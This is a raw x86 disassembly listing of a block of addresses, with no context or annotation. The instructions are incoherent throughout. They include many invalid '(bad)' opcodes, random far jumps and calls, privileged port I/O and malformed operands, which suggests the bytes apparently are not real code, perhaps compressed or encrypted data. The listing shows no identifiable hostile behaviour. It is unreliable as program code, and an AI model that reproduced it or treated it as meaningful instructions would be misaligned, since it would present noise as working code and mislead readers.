  405d8c:	cmc    
  405d8d:	and    al,0x2b
  405d8f:	and    eax,0xb2c4a09f
  405d94:	outs   dx,BYTE PTR ds:[esi]
  405d95:	mov    al,0xec
  405d97:	adc    ah,BYTE PTR [eax+0x647b6323]
  405d9d:	jle    0x405deb
  405d9f:	push   ecx
  405da0:	jmp    0x405d68
  405da2:	jno    0x405db1
  405da4:	sub    al,ch
  405da6:	jne    0x405d4f
  405da8:	lods   al,BYTE PTR ds:[esi]
  405da9:	mov    ecx,0xa81cbb9a
  405dae:	stos   BYTE PTR es:[edi],al
  405daf:	lock mov BYTE PTR [ebx],cl
  405db2:	dec    ecx
  405db3:	ins    BYTE PTR es:[edi],dx
  405db4:	aaa    
  405db5:	test   eax,0x69f5bc
  405dba:	dec    ebp
  405dbb:	cld    
  405dbc:	or     DWORD PTR [esi+0x68],ecx
  405dbf:	inc    ecx
  405dc0:	inc    ecx
  405dc1:	push   edi
  405dc2:	inc    ebx
  405dc3:	sub    al,0x6b
  405dc5:	jne    0x405dc8
  405dc7:	pop    esp
  405dc8:	je     0x405d4c
  405dca:	scas   al,BYTE PTR es:[edi]
  405dcb:	pop    edi
  405dcc:	mov    cl,0x3e
  405dce:	scas   eax,DWORD PTR es:[edi]
  405dcf:	arpl   WORD PTR [ebx+0x20230150],bx
  405dd5:	ds js  0x405dae
  405dd8:	jno    0x405d60
  405dda:	into   
  405ddb:	or     eax,0x489595fa
  405de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405de1:	arpl   WORD PTR [ecx*4+0x2518a75],sp
  405de8:	add    edi,DWORD PTR [ebx+ebp*4]
  405deb:	aas    
  405dec:	mov    eax,ds:0x33616a85
  405df1:	cmp    ah,dh
  405df3:	jo     0x405dc5
  405df5:	jl     0x405e34
  405df7:	ror    BYTE PTR [edi+0x42d721ab],cl
  405dfd:	(bad)  
  405dfe:	dec    edx
  405dff:	repz mov edx,0xfa3db09a
  405e05:	in     al,0xbf
  405e07:	js     0x405e31
  405e09:	mov    al,ds:0x1fb5a1d7
  405e0e:	push   edx
  405e0f:	pop    ds
  405e10:	add    al,BYTE PTR es:[edi-0x72bb56c7]
  405e17:	(bad)  
  405e18:	(bad)  
  405e19:	adc    dh,BYTE PTR [ebx+0x3a]
  405e1c:	push   edx
  405e1d:	jp     0x405e33
  405e1f:	inc    ecx
  405e20:	or     BYTE PTR [ebp-0x12],al
  405e23:	dec    eax
  405e24:	and    eax,0xff917fa8
  405e29:	mov    esi,0x514cfa45
  405e2e:	mov    edi,0x1063dbc6
  405e33:	bound  edx,QWORD PTR [ebx+edx*1]
  405e36:	mov    ebx,0xf0132e4d
  405e3b:	ins    BYTE PTR es:[edi],dx
  405e3c:	pop    ds
  405e3d:	pop    eax
  405e3e:	and    dh,BYTE PTR [ebx]
  405e40:	shr    DWORD PTR [esi-0x307ecca2],1
  405e46:	retf   
  405e47:	cmp    eax,0x7e40b914
  405e4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e4d:	push   ds
  405e4e:	ret    
  405e4f:	test   ch,al
  405e51:	or     dh,BYTE PTR [eax-0x63]
  405e54:	inc    edi
  405e55:	pushf  
  405e56:	lahf   
  405e57:	push   es
  405e58:	out    dx,eax
  405e59:	xor    eax,0xdf5410b1
  405e5e:	fndisi(8087 only) 
  405e60:	pop    esi
  405e61:	sbb    cl,BYTE PTR es:[eax]
  405e64:	dec    esp
  405e65:	add    al,0xab
  405e67:	push   eax
  405e68:	dec    ecx
  405e69:	pop    esi
  405e6a:	aam    0xd0
  405e6c:	stos   DWORD PTR es:[edi],eax
  405e6d:	fcomp  DWORD PTR es:[eax-0x3a]
  405e71:	popf   
  405e72:	mov    dh,0x6d
  405e74:	rcl    DWORD PTR [esi-0x30],0x69
  405e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e79:	test   al,0x77
  405e7b:	mov    ds:0x1a49d265,eax
  405e80:	lahf   
  405e81:	loopne 0x405ef4
  405e83:	push   0xffffff83
  405e85:	jl     0x405ed6
  405e87:	inc    ecx
  405e88:	scas   eax,DWORD PTR es:[edi]
  405e89:	and    ecx,DWORD PTR cs:[edi+0x7f2d02dc]
  405e90:	fst    DWORD PTR [ebx]
  405e92:	ja     0x405e3d
  405e94:	sbb    bl,BYTE PTR gs:[eax+0x55]
  405e98:	pushf  
  405e99:	inc    ebx
  405e9a:	leave  
  405e9b:	sbb    cl,BYTE PTR [ebp+0x75]
  405e9e:	cdq    
  405e9f:	bound  ebp,QWORD PTR [eax+0x70]
  405ea2:	cs sub al,0xe0
  405ea5:	cmp    esi,DWORD PTR ds:0x19b20552
  405eab:	pop    ebp
  405eac:	xchg   edi,eax
  405ead:	jge    0x405e82
  405eaf:	sbb    al,0xd4
  405eb1:	push   edi
  405eb2:	dec    edi
  405eb3:	inc    eax
  405eb4:	sbb    edx,DWORD PTR [edi-0x7f3be72c]
  405eba:	pop    esi
  405ebb:	(bad)  
  405ebc:	pop    edx
  405ebd:	pop    ds
  405ebe:	out    0xe7,eax
  405ec0:	add    eax,0x4b544381
  405ec5:	or     dh,BYTE PTR [eax]
  405ec7:	add    eax,0x22e0edd7
  405ecc:	mov    al,ds:0xcbf154a1
  405ed1:	add    edi,edx
  405ed3:	in     al,0xbf
  405ed5:	mov    esp,DWORD PTR [eax-0x4c5d8222]
  405edb:	in     eax,dx
  405edc:	mov    ah,0x2
  405ede:	dec    edi
  405edf:	fcmovnu st,st(5)
  405ee1:	and    al,0x83
  405ee3:	dec    ebp
  405ee4:	in     eax,dx
  405ee5:	xchg   esp,eax
  405ee6:	jp     0x405ea2
  405ee8:	jbe    0x405ede
  405eea:	mov    al,0x4
  405eec:	arpl   dx,sp
  405eee:	and    DWORD PTR [ebp-0x6df20167],0xffffffef
  405ef5:	idiv   ebp
  405ef7:	adc    edi,DWORD PTR [esi]
  405ef9:	or     edx,DWORD PTR [esi]
  405efb:	je     0x405f62
  405efd:	sbb    edi,ecx
  405eff:	call   0x276d7f77
  405f04:	int    0xe9
  405f06:	jbe    0x405e88
  405f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f09:	mov    edi,0xe7c6ef1e
  405f0e:	mov    eax,0x17d898fe
  405f13:	jbe    0x405ed7
  405f15:	inc    edx
  405f16:	sbb    ebx,ebx
  405f18:	fadd   QWORD PTR [edi+0x5e081aed]
  405f1e:	xchg   esi,eax
  405f20:	shl    BYTE PTR [ebx],0xdd
  405f23:	nop
  405f24:	pop    ebx
  405f25:	enter  0x82f,0xc1
  405f29:	enter  0xcd66,0xd0
  405f2d:	jbe    0x405f6b
  405f2f:	test   BYTE PTR [edx+0x2040859],0x1f
  405f36:	ins    DWORD PTR es:[edi],dx
  405f37:	shr    BYTE PTR [edx],cl
  405f39:	test   bl,bh
  405f3b:	nop
  405f3c:	cld    
  405f3d:	test   DWORD PTR ds:0x2f63e348,edx
  405f43:	or     eax,0x3bbd8ea2
  405f48:	mov    ebp,0x6484d587
  405f4d:	sbb    DWORD PTR [edx+0x532cc62e],0x23
  405f54:	mov    eax,DWORD PTR [eax+0x4f4a0c69]
  405f5a:	dec    ecx
  405f5b:	xchg   edx,eax
  405f5c:	(bad)
  405f60:	inc    ebp
  405f61:	and    BYTE PTR ds:0x5856a283,ch
  405f67:	pop    ebp
  405f68:	push   0x32
  405f6a:	in     eax,dx
  405f6b:	lods   eax,DWORD PTR ds:[esi]
  405f6c:	ret    0x15bf
  405f6f:	inc    esi
  405f70:	mov    edi,DWORD PTR [ecx-0x6a]
  405f73:	push   eax
  405f74:	pop    ss
  405f75:	xor    eax,0x4051353f
  405f7a:	dec    edx
  405f7b:	aas    
  405f7c:	ins    DWORD PTR es:[edi],dx
  405f7d:	imul   ecx,DWORD PTR [eax+0x76],0x36
  405f81:	scas   al,BYTE PTR es:[edi]
  405f82:	inc    esp
  405f83:	jo     0x405f26
  405f85:	add    ch,BYTE PTR [ebx]
  405f87:	or     eax,0x4f92841d
  405f8c:	clc    
  405f8d:	jp     0x405f14
  405f8f:	ret    
  405f90:	or     bl,al
  405f92:	icebp  
  405f93:	push   cs
  405f94:	mov    cl,0xd1
  405f97:	jb     0x405ff8
  405f99:	js     0x405f49
  405f9b:	or     DWORD PTR [edi-0x61],ecx
  405f9e:	xchg   ecx,eax
  405f9f:	enter  0x53e2,0xa
  405fa3:	cwde   
  405fa4:	push   ecx
  405fa5:	(bad)  
  405fa6:	int3   
  405fa7:	dec    ebp
  405fa8:	xchg   edi,eax
  405fa9:	inc    eax
  405faa:	ss cmp eax,0x2cf591e9
  405fb0:	in     eax,dx
  405fb1:	enter  0x5acc,0x8
  405fb5:	sbb    eax,0xa984d084
  405fba:	dec    esi
  405fbb:	(bad)  
  405fbc:	dec    esp
  405fbd:	cmp    eax,ebx
  405fbf:	pushf  
  405fc0:	mov    esi,0x9e903045
  405fc5:	mov    ds:0x86c964a7,al
  405fca:	loopne 0x406032
  405fcc:	and    al,0x4
  405fce:	popa   
  405fcf:	(bad)  
  405fd0:	sub    al,0x36
  405fd2:	data16 mov BYTE PTR [ebp+0x5e],0x8e
  405fd7:	xlat   BYTE PTR ds:[ebx]
  405fd8:	int    0xf0
  405fda:	mov    bl,0x17
  405fdc:	push   edx
  405fdd:	mov    edx,0xda74f55c
  405fe2:	stc    
  405fe3:	xor    esp,ecx
  405fe5:	rcl    DWORD PTR [edi+0x9],0xe2
  405fe9:	push   0xffffffd3
  405feb:	mov    ds:0x68681099,eax
  405ff0:	jmp    0x7d0c:0x7e3378c3
  405ff7:	cmc    
  405ff8:	in     eax,0xeb
  405ffa:	adc    eax,0x55768169
  405fff:	xor    ebp,DWORD PTR [esi+esi*4]
  406002:	ret    
  406003:	pop    ss
  406004:	xlat   BYTE PTR ds:[ebx]
  406005:	stc    
  406006:	fcomp  DWORD PTR [eax]
  406008:	sahf   
  406009:	sbb    DWORD PTR [eax-0x3d055d47],ecx
  40600f:	mov    ebx,0x8954fc2d
  406014:	leave  
  406015:	leave  
  406016:	pop    es
  406017:	pop    ds
  406018:	mov    esi,0x351012a
  40601d:	push   ss
  40601e:	fist   DWORD PTR [eax-0x1cbc3fee]
  406024:	hlt    
  406025:	add    dh,BYTE PTR [ecx-0x2c5962a3]
  40602b:	dec    esi
  40602c:	int    0xa9
  40602e:	scas   al,BYTE PTR es:[edi]
  40602f:	xor    edx,edi
  406031:	icebp  
  406032:	cmp    eax,0xd7571c1b
  406037:	mov    bh,0xa
  406039:	add    edi,eax
  40603b:	shr    BYTE PTR [ebp-0x54fb8fca],1
  406041:	out    dx,al
  406042:	rol    DWORD PTR [eax+ebx*8+0x19100862],1
  406049:	loope  0x4060a9
  40604b:	shr    BYTE PTR [esi+ecx*8-0x21],0x25
  406050:	xor    eax,0x3af09e2c
  406055:	and    BYTE PTR [edx+ebx*1+0x2fa95ec5],dh
  40605c:	push   cs
  40605d:	inc    eax
  40605e:	in     eax,dx
  40605f:	and    bh,ah
  406061:	in     eax,dx
  406062:	push   ebx
  406063:	add    ah,dl
  406065:	jmp    0x1d316d49
  40606a:	inc    ebx
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	sub    ecx,DWORD PTR [edx-0x2030a2bd]
  406073:	jne    0x4060c8
  406075:	inc    esi
  406076:	xor    eax,esi
  406078:	ds loope 0x40601d
  40607b:	rcl    BYTE PTR [eax+0x4d52b9ad],1
  406081:	imul   BYTE PTR [edx]
  406083:	mov    esp,DWORD PTR [ebp-0x12]
  406086:	cs int 0x9f
  406089:	loope  0x40604b
  40608b:	call   0xa595:0xf0bdef16
  406092:	mov    cl,0xc3
  406094:	(bad)  
  406095:	(bad)  
  406096:	aam    0x58
  406098:	and    DWORD PTR [edx],ebp
  40609a:	jmp    0x4b1b2162
  40609f:	rol    BYTE PTR [edx+0x13089d1c],cl
  4060a5:	cmp    al,0x43
  4060a7:	das    
  4060a8:	mov    dh,0x3c
  4060aa:	sbb    DWORD PTR [edx+0x26],0x4932a02d
  4060b1:	pop    ss
  4060b2:	lea    esi,[ebx-0x3b]
  4060b5:	cmp    al,0xe5
  4060b7:	das    
  4060b8:	out    dx,eax
  4060b9:	pusha  
  4060ba:	xlat   BYTE PTR ds:[ebx]
  4060bb:	fnsave [edi+0x7a]
  4060be:	or     esi,ebx
  4060c0:	mov    ecx,DWORD PTR [edx]
  4060c2:	aam    0x9e
  4060c4:	(bad)  
  4060c5:	lea    edi,[edx]
  4060c7:	pop    esi
  4060c8:	pusha  
  4060c9:	add    DWORD PTR [edi+0x59],ebx
  4060cc:	cwde   
  4060cd:	inc    ebx
  4060ce:	xor    DWORD PTR [ebx],ebx
  4060d0:	sub    BYTE PTR [edi-0x9],0xcc
  4060d4:	and    cl,0x40
  4060d7:	rcl    BYTE PTR ds:0x2fec7ef2,1
  4060dd:	inc    eax
  4060de:	sbb    ch,BYTE PTR [eax+0x51f96e01]
  4060e4:	pop    ds
  4060e5:	sbb    eax,0x609123d9
  4060ea:	add    bl,BYTE PTR [esi-0x380afc05]
  4060f0:	fisubr DWORD PTR [eax+0x4f06cf4b]
  4060f6:	sti    
  4060f7:	loope  0x406161
  4060f9:	scas   eax,DWORD PTR es:[edi]
  4060fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060fb:	lods   eax,DWORD PTR ds:[esi]
  4060fc:	pop    ds
  4060fd:	jge    0x4060fc
  4060ff:	dec    ecx
  406100:	test   eax,0x40c30bf7
  406105:	push   esp
  406106:	sbb    ebx,esp
  406108:	sbb    al,0x1c
  40610a:	cmp    cl,ch
  40610c:	and    BYTE PTR [edx+edi*2+0x59a67b73],al
  406113:	mov    eax,0xa6a195f8
  406118:	mov    ?,WORD PTR [esi]
  40611a:	inc    eax
  40611b:	mov    eax,ds:0x1b52d772
  406120:	pushf  
  406121:	(bad)  
  406122:	adc    al,0x8
  406124:	rol    DWORD PTR [edx+0x2f],0x2c
  406128:	dec    edi
  406129:	inc    ebp
  40612a:	arpl   ax,ax
  40612c:	pop    ss
  40612d:	xchg   esi,eax
  40612e:	rcl    BYTE PTR [ebx-0x74],cl
  406131:	call   0x8fa0:0x89d13047
  406138:	into   
  406139:	loopne 0x406126
  40613b:	lods   al,BYTE PTR ds:[esi]
  40613c:	sub    edi,DWORD PTR [ebp+0x68]
  40613f:	or     al,0x1
  406141:	ror    BYTE PTR [edx*1-0xe0deda1],0xc2
  406149:	push   esi
  40614a:	and    ah,BYTE PTR [esi]
  40614c:	inc    eax
  40614d:	dec    edi
  40614e:	or     ebp,DWORD PTR [edi-0x5]
  406151:	mov    cl,ah
  406153:	pop    ss
  406154:	ror    BYTE PTR [edi],0xc3
  406157:	mov    esi,0xd494f41c
  40615c:	push   ebx
  40615d:	add    al,0xb8
  40615f:	and    eax,0x24120df8
  406164:	ret    
  406165:	cli    
  406166:	sub    al,0x75
  406168:	mov    eax,0xad4a9428
  40616d:	xchg   ah,dl
  40616f:	ja     0x40614c
  406171:	(bad)  
  406172:	fistp  DWORD PTR [edi+0x36]
  406175:	and    esi,DWORD PTR [ecx+ecx*1-0x2b]
  406179:	lds    edi,FWORD PTR [ebp+0x5b]
  40617c:	add    BYTE PTR [edx+edi*8],cl
  40617f:	jle    0x40613a
  406181:	xchg   ecx,eax
  406182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406183:	xchg   esp,eax
  406184:	or     eax,0xb87666ad
  406189:	push   0x806ebc98
  40618e:	xchg   edi,eax
  40618f:	or     eax,0xa22e8e2d
  406194:	fld    TBYTE PTR [ecx]
  406196:	das    
  406197:	repz add al,0x8f
  40619a:	fwait
  40619b:	push   ss
  40619c:	aad    0x2e
  40619e:	adc    BYTE PTR [edi+0x78],dl
  4061a1:	push   ecx
  4061a2:	sbb    BYTE PTR [ecx+0x2a6fbaa],0xee
  4061a9:	pop    edi
  4061aa:	add    ebp,DWORD PTR [ebx+eax*2+0x2ffded05]
  4061b1:	pop    ss
  4061b2:	pop    edi
  4061b3:	loopne 0x4061cc
  4061b5:	das    
  4061b6:	loopne 0x406151
  4061b8:	mov    ebp,0x7dcff03
  4061bd:	or     al,0x7
  4061bf:	pushf  
  4061c0:	ficomp DWORD PTR [esi]
  4061c2:	hlt    
  4061c3:	fstp   DWORD PTR [edi-0x5a3c6d69]
  4061c9:	mov    dl,0x8b
  4061cb:	call   0xcf5e:0x822bbbdc
  4061d2:	(bad)
  4061d5:	in     eax,dx
  4061d6:	xor    cl,0xd3
  4061d9:	mov    eax,ds:0x639cf2a8
  4061de:	push   ebx
  4061df:	sub    BYTE PTR [esi+0x5ab60a0c],cl
  4061e5:	shl    edx,1
  4061e7:	pop    ebp
  4061e8:	repnz bound esp,QWORD PTR cs:[eax+0x73f19fb0]
  4061f0:	push   ebx
  4061f1:	jle    0x4061a1
  4061f3:	rcl    DWORD PTR [esi],1
  4061f5:	shl    DWORD PTR [ecx+edx*2-0x45],cl
  4061f9:	les    edi,FWORD PTR [esi]
  4061fb:	sbb    ebx,DWORD PTR ds:0x441ada8d
  406201:	mov    ds:0x5ff61d25,al
  406206:	mov    esp,0xe4f19c87
  40620b:	ret    0x8b50
  40620e:	in     eax,dx
  40620f:	xchg   eax,esi
  406211:	inc    edi
  406212:	adc    DWORD PTR [ebp+esi*1-0x25],esp
  406216:	mov    edi,0x2f96eb91
  40621b:	ss loop 0x40628e
  40621e:	mov    WORD PTR [esi],es
  406220:	into   
  406221:	inc    ebp
  406222:	or     eax,0xad9281a2
  406227:	adc    eax,edx
  406229:	fwait
  40622a:	jl     0x406225
  40622c:	push   cs
  40622d:	lea    ebp,[edi+0x1]
  406230:	mov    ds:0xf044290b,al
  406235:	loope  0x40626d
  406237:	or     BYTE PTR [eax+0x846373],0x9b
  40623e:	mov    ch,0x80
  406240:	ins    BYTE PTR es:[edi],dx
  406241:	xor    ecx,DWORD PTR [edi]
  406243:	js     0x406205
  406245:	push   ecx
  406246:	lds    ebx,FWORD PTR es:[edi+0x651b19cb]
  40624d:	mov    edi,edi
  40624f:	fdivr  st(6),st
  406251:	mov    ebx,0xc655bc3f
  406256:	jnp    0x406260
  406258:	lock jge 0x406295
  40625b:	or     al,0x8a
  40625d:	inc    ebx
  40625e:	test   DWORD PTR [esi],ebp
  406260:	mov    DWORD PTR [esp+eax*8],esp
  406263:	dec    ebx
  406264:	pop    esi
  406265:	daa    
  406266:	stc    
  406267:	dec    esp
  406268:	jmp    0xd96a6554
  40626d:	sbb    al,BYTE PTR [edx+0x2867a1d6]
  406273:	mov    DWORD PTR [edi+0x73436ea7],eax
  406279:	test   al,0x16
  40627b:	adc    eax,0xee6877e2
  406280:	mov    eax,0xb1207144
  406285:	loop   0x4062ee
  406287:	xor    BYTE PTR es:[edi+edx*1-0x2c2c0bff],dl
  40628f:	dec    esp
  406290:	sbb    ecx,esi
  406292:	and    cl,BYTE PTR [ebp-0x13]
  406295:	adc    ebp,ebp
  406297:	(bad)  
  406298:	in     al,dx
  406299:	arpl   dx,di
  40629b:	scas   al,BYTE PTR es:[edi]
  40629c:	(bad)  [ebp+0x0]
  40629f:	xchg   esp,eax
  4062a0:	aaa    
  4062a1:	jmp    0x406310
  4062a3:	fxtract 
  4062a5:	sbb    DWORD PTR gs:[edi+0x7cb1dc1a],esi
  4062ac:	and    cl,BYTE PTR [eax-0x32]
  4062af:	mov    bl,dh
  4062b1:	mov    ecx,0x6168f7a2
  4062b6:	enter  0xc63,0x8f
  4062ba:	mov    esp,edx
  4062bc:	mov    ds:0xbf9308aa,eax
  4062c1:	sub    eax,DWORD PTR [edx-0x25495cc0]
  4062c7:	ror    BYTE PTR [edx-0x1d],1
  4062ca:	aam    0xd
  4062cc:	into   
  4062cd:	or     eax,0xbe820146
  4062d2:	mov    al,0x5a
  4062d4:	pusha  
  4062d5:	mov    ?,WORD PTR [edi+0x7c]
  4062d8:	mov    cl,0x8c
  4062da:	leave  
  4062db:	out    0x5,eax
  4062dd:	sbb    ah,BYTE PTR [eax-0x9f9115f]
  4062e3:	mov    esi,0xd7be3f27
  4062e8:	mov    edx,DWORD PTR [edi+0x588997fe]
  4062ee:	loope  0x40628b
  4062f0:	dec    esi
  4062f1:	call   FWORD PTR [ebx+esi*8-0x3feba317]
  4062f8:	repnz test al,0xc4
  4062fb:	imul   ebx,DWORD PTR [eax+edx*8+0x2f80e35a],0x4a1e70b7
  406306:	arpl   WORD PTR [esi+0x44cbb810],bx
  40630c:	pop    ds
  40630d:	call   FWORD PTR [eax]
  40630f:	jp     0x4062b5
  406311:	inc    esi
  406312:	shr    BYTE PTR [eax-0x50],0x84
  406316:	in     eax,0xfb
  406318:	lea    ebx,[ecx+0x57e4bc81]
  40631e:	or     edx,DWORD PTR [eax+0x659f00a1]
  406324:	pop    ebp
  406325:	jno    0x40635b
  406327:	shr    ebp,0xba
  40632a:	add    ebx,DWORD PTR [edx-0x1c]
  40632d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40632e:	mov    ecx,0x49686909
  406333:	lods   al,BYTE PTR ds:[esi]
  406334:	mov    dl,0xe
  406336:	jo     0x4063b5
  406338:	mov    dl,BYTE PTR [ecx]
  40633a:	es ja  0x40630d
  40633d:	and    al,bl
  40633f:	push   esp
  406340:	popa   
  406341:	enter  0x9898,0x1
  406345:	sti    
  406346:	aas    
  406347:	xor    DWORD PTR [esp+ecx*8],edx
  40634a:	out    dx,eax
  40634b:	xor    DWORD PTR [edi+ecx*8+0x19936975],ecx
  406352:	mov    dl,0x12
  406354:	fbstp  TBYTE PTR [ecx-0x7c]
  406357:	push   ebp
  406358:	imul   esp,DWORD PTR [esi],0xc75efc13
  40635e:	das    
  40635f:	sar    BYTE PTR [ecx+0x2f6f73f0],1
  406365:	mov    ch,0x9e
  406367:	xchg   ecx,eax
  406368:	dec    BYTE PTR [ebx+eiz*1+0x75]
  40636c:	stos   DWORD PTR es:[edi],eax
  40636d:	push   ecx
  40636e:	sub    DWORD PTR [ebx],edx
  406370:	adc    BYTE PTR ds:0x788dc82f,dl
  406376:	jmp    0x766d20f9
  40637b:	fisubr WORD PTR [ebx]
  40637d:	jo     0x40630b
  40637f:	les    ebp,FWORD PTR [ecx+0x436e7559]
  406385:	loope  0x4063e8
  406387:	mov    cl,0xc
  406389:	pop    edx
  40638a:	xchg   edi,eax
  40638b:	xchg   ebx,eax
  40638c:	adc    ecx,DWORD PTR [esp+eiz*8-0x588d2730]
  406393:	sub    al,0x8a
  406395:	sub    eax,0x9004bf79
  40639a:	mov    ds:0xed038d98,eax
  40639f:	mov    bh,0x1a
  4063a1:	dec    esp
  4063a2:	sbb    dl,dh
  4063a4:	adc    al,0x58
  4063a6:	rol    esp,cl
  4063a8:	xor    al,BYTE PTR [ecx-0x28d8201]
  4063ae:	push   cs
  4063af:	lods   eax,DWORD PTR ds:[esi]
  4063b0:	stc    
  4063b1:	das    
  4063b2:	mov    esi,0x274ee70a
  4063b7:	std    
  4063b8:	mov    ?,WORD PTR [ecx]
  4063ba:	adc    al,bl
  4063bc:	push   0xffffff8a
  4063be:	retf   
  4063bf:	inc    esi
  4063c0:	xor    BYTE PTR [ebx],ah
  4063c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063c3:	aaa    
  4063c4:	or     al,0xcd
  4063c6:	fdiv   DWORD PTR [ebx]
  4063c8:	call   0xe4a2:0x72eb8dc8
  4063cf:	clc    
  4063d0:	mov    ecx,0x8b38e62a
  4063d5:	mov    bh,0x96
  4063d7:	sbb    DWORD PTR ds:0xf7ea9d7e,edx
  4063dd:	cmp    ax,0xa0f5
  4063e1:	test   DWORD PTR [ebx],ecx
  4063e3:	out    dx,al
  4063e4:	cmp    edi,DWORD PTR [esi-0x43]
  4063e7:	aam    0x9a
  4063e9:	mov    eax,0x11fa3263
  4063ee:	in     eax,dx
  4063ef:	in     eax,0xb4
  4063f1:	push   ebx
  4063f2:	test   al,0xdc
  4063f4:	shl    BYTE PTR [edi],0xaa
  4063f7:	jmp    0xe22b:0x7156143f
  4063fe:	retf   
  4063ff:	push   ebp
  406400:	addr16 push 0xffffffb5
  406403:	inc    esi
  406404:	inc    edx
  406405:	imul   esi,DWORD PTR [edi+0x47b1f2ff],0xe9d87d55
  40640f:	jge    0x4063fb
  406411:	mov    ah,0xa7
  406413:	sub    BYTE PTR [edi],bh
  406415:	jecxz  0x406427
  406417:	mov    al,ds:0x31271d71
  40641c:	mov    ch,BYTE PTR [ebp-0x4bf42491]
  406422:	jnp    0x406457
  406424:	enter  0xef5b,0xf1
  406428:	xor    eax,esp
  40642a:	mov    ds:0xa3f8f612,eax
  40642f:	orps   xmm6,xmm1
  406432:	ins    DWORD PTR es:[edi],dx
  406433:	pusha  
  406434:	sub    al,0x2c
  406436:	cmp    ebx,eax
  406438:	add    DWORD PTR ds:0x142bbeb7,edx
  40643e:	in     eax,dx
  40643f:	cmp    edi,edx
  406441:	mov    ebp,0xe20ec9a4
  406446:	ins    DWORD PTR es:[edi],dx
  406447:	and    eax,0xdfc1a780
  40644c:	pushf  
  40644d:	xchg   edi,eax
  40644e:	xchg   edx,eax
  40644f:	pop    esp
  406450:	and    eax,0xea0936f7
  406455:	sbb    DWORD PTR [eax-0x20],edi
  406458:	cdq    
  406459:	sbb    eax,0x77a0ff85
  40645e:	in     eax,dx
  40645f:	cmova  esp,esi
  406462:	pusha  
  406463:	mov    edi,0xa8ae7704
  406468:	mov    al,0x57
  40646a:	xor    edi,edi
  40646c:	ret    0xd267
  40646f:	iret   
  406470:	add    al,0x48
  406473:	lock push ebx
  406475:	jno    0x406470
  406477:	je     0x406491
  406479:	push   cs
  40647a:	xor    DWORD PTR ds:0xf50b6e23,0x24
  406481:	push   ebx
  406482:	sbb    eax,0x7ed8e474
  406487:	outs   dx,BYTE PTR ds:[esi]
  406488:	mov    ch,0x9
  40648a:	gs call 0x54b5:0x7a6d3c9c
  406492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406493:	dec    ebx
  406494:	ds add edi,edi
  406497:	in     al,0xd
  406499:	and    ah,BYTE PTR [edx-0x29]
  40649c:	xchg   ebp,eax
  40649d:	jp     0x4064c3
  40649f:	sbb    BYTE PTR ds:0x65191e8d,ah
  4064a5:	push   DWORD PTR [eax-0x1948274b]
  4064ab:	dec    ecx
  4064ac:	or     eax,0x2dbd0ad4
  4064b1:	mov    esp,0xd929c12e
  4064b6:	cwde   
  4064b7:	sub    ah,bh
  4064b9:	push   ds
  4064ba:	push   ss
  4064bb:	sub    eax,0x60ae956
  4064c0:	fucom  st(1)
  4064c2:	jge    0x4064e8
  4064c4:	sub    al,0xe5
  4064c6:	ds xchg ebx,eax
  4064c8:	retf   0x52c2
  4064cb:	dec    ecx
  4064cc:	and    DWORD PTR [ecx-0x32],esi
  4064cf:	scas   eax,DWORD PTR es:[edi]
  4064d0:	and    eax,0xcbacf8aa
  4064d5:	mov    eax,ds:0x858d5c63
  4064da:	test   DWORD PTR [ebx+0x69],ebp
  4064dd:	call   0x7e07df18
  4064e2:	pop    ebx
  4064e3:	xchg   DWORD PTR [ebp-0xaeb595b],esp
  4064e9:	aaa    
  4064ea:	jmp    0x41c5:0xb44962f3
  4064f1:	aas    
  4064f2:	stos   DWORD PTR es:[edi],eax
  4064f3:	aam    0xb8
  4064f5:	jb     0x406529
  4064f7:	(bad)  
  4064f8:	int3   
  4064f9:	(bad)  
  4064fa:	int3   
  4064fb:	lahf   
  4064fc:	cmp    esi,esp
  4064fe:	out    dx,eax
  4064ff:	inc    ecx
  406500:	xchg   edx,eax
  406501:	fcomi  st,st(0)
  406503:	adc    DWORD PTR [ecx-0x7ae773df],esi
  406509:	popa   
  40650a:	jbe    0x406545
  40650c:	push   ebp
  40650d:	(bad)  
  40650e:	scas   al,BYTE PTR es:[edi]
  40650f:	das    
  406510:	das    
  406511:	enter  0x1428,0x67
  406515:	mov    ecx,0xa836cdb4
  40651a:	jbe    0x406510
  40651c:	test   al,0x90
  40651e:	push   ebx
  40651f:	aad    0x27
  406521:	xchg   esi,eax
  406522:	lahf   
  406523:	xor    eax,0xa5cdb726
  406528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406529:	test   al,0x1f
  40652b:	aas    
  40652c:	jl     0x4064bb
  40652e:	pushf  
  40652f:	cmp    dh,bl
  406531:	sbb    DWORD PTR [esi+0x13a837a],0x70
  406538:	xor    dh,dh
  40653a:	jmp    0x5368:0x6e3159d3
  406541:	repnz retf 0x68b4
  406545:	sbb    esi,DWORD PTR [esi+0x1f]
  406548:	retf   0x5837
  40654b:	pop    eax
  40654c:	rol    BYTE PTR [ebp-0xc],0xe0
  406550:	xchg   esi,eax
  406551:	sbb    eax,0xad2dc4b3
  406556:	hlt    
  406557:	repz add esp,DWORD PTR [esi-0x534e4779]
  40655e:	lods   eax,DWORD PTR ds:[esi]
  40655f:	pop    ecx
  406560:	cmp    BYTE PTR [eax+0x7e539050],ch
  406566:	add    DWORD PTR [ebx+0x776dbab9],0x47
  40656d:	ss dec esi
  40656f:	fisub  DWORD PTR [ebx+0x537c7f5e]
  406575:	rcl    ecx,1
  406577:	xlat   BYTE PTR ds:[ebx]
  406578:	inc    DWORD PTR [edx-0x5d2756ea]
  40657e:	sub    edx,DWORD PTR [eax+0x3383984]
  406584:	sbb    BYTE PTR [ecx],bh
  406586:	enter  0xe842,0x44
  40658a:	ds cdq 
  40658c:	push   edi
  40658d:	jl     0x4065f9
  40658f:	test   esp,ebx
  406591:	mov    eax,ds:0x3e672da2
  406596:	and    eax,0x1c4310c6
  40659b:	imul   edx,DWORD PTR [eax+0x53],0x5287358e
  4065a2:	pop    edx
  4065a3:	imul   BYTE PTR [ecx]
  4065a5:	and    DWORD PTR [ebx+0x185a0406],ebx
